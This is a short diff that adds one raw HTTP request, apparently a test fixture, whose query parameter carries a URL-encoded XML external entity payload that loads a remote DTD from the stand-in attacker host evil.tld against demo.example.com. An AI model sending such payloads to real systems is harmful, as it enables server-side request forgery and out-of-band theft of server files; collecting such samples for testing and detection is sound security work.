@@ -1,0 +1,4 @@
+GET /a?cmd=<!ENTITY%0a%%0aremote%0aSYSTEM%0a"http://evil.tld/x.dtd">%remote; HTTP/1.1
+Host: demo.example.com
+Connection: close
+
